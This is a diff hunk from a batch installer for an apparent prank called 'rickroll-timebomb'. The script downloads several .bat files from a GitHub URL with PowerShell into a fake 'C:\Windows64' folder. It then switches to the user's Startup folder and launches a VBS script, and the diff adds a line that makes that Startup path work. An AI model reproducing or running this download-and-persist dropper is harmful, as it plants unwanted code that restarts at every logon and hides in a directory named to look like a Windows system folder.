@@ -12,5 +12,6 @@ powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadTimer.bat -OutFile C:\Windows64\rickroll\missing\DownloadTimer.bat"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadVideo.bat -OutFile C:\Windows64\rickroll\missing\DownloadVideo.bat"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/missing/DownloadVolumeUp.bat -OutFile C:\Windows64\rickroll\missing\DownloadVolumeUp.bat"
+cd %userprofile%
 cd ".\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 WScript "FileChecker.vbs"
